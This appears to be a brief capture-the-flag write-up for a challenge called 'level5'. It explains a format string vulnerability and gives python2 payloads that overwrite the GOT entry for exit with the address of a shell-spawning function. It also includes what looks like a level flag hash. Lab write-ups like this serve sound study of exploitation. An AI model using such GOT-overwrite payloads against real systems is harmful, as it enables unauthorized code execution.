level5:0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

format string vuln again

```shell
root@81bba73d829e:~# ./level5
AAAA %4$x
AAAA 41414141
```

A shell is run at `0x080484a4` function `o` => `134513828`

`objdump -R ./level5` to get the GOT (Global Offset Table)

binary is dynamically linked so we can overwrite the addresse where the address of `exit` is stored `0x8049838` and write it down the address of the `o` function

to test in gdb: `set {int}0x8049838 = 0x080484a4`

test payload: `python2 -c 'print "\x38\x98\x04\x08" + "%4$n"' > payloadlevel5`

`python2 -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/payloadlevel5`

